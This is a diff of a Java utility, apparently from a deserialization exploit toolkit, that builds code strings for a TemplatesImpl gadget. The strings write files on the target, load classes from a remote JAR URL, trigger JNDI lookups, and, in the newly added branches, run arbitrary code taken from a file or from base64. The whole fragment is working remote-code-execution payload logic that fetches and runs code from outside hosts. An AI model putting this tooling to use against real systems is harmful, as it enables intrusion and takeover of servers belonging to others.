@@ -86,22 +86,28 @@ public class TemplatesImplUtil {
             byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
             String fileByteCode = CommonUtil.byteToByteArrayString(fileContent);
             cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
-        } else if (command.toLowerCase().contains(CustomCommand.COMMAND_LOADJAR)){
+        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR)){
             String cmdInfo = command.substring(CustomCommand.COMMAND_LOADJAR.length());
             String jarpath = cmdInfo.split("\\|")[0];
             String className = cmdInfo.split("\\|")[1];
             cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                 "classLoader.loadClass(\"%s\").newInstance();",jarpath,className);
-        } else if(command.toLowerCase().contains(CustomCommand.COMMAND_LOADJAR_WITH_ARGS)) {
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_LOADJAR_WITH_ARGS)) {
             String cmdInfo = command.substring(CustomCommand.COMMAND_LOADJAR_WITH_ARGS.length());
             String jarpath = cmdInfo.split("\\|")[0];
             String className = cmdInfo.split("\\|")[1];
             String args = cmdInfo.split("\\|")[2];
             cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                 "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
-        } else if (command.toLowerCase().contains(CustomCommand.COMMAND_JNDI)){
+        } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
             String jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
             cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CODE_FILE)){
+            String codeFile = command.substring(CustomCommand.COMMAND_CODE_FILE.length());
+            cmd = new String(CommonUtil.readFileByte(codeFile));
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CODE_BASE64)){
+            String codeBase64 = command.substring(CustomCommand.COMMAND_CODE_BASE64.length());
+            cmd = new String(new BASE64Decoder().decodeBuffer(codeBase64));
         } else {
             throw new Exception(String.format("Command [%s] not supported",command));
         }
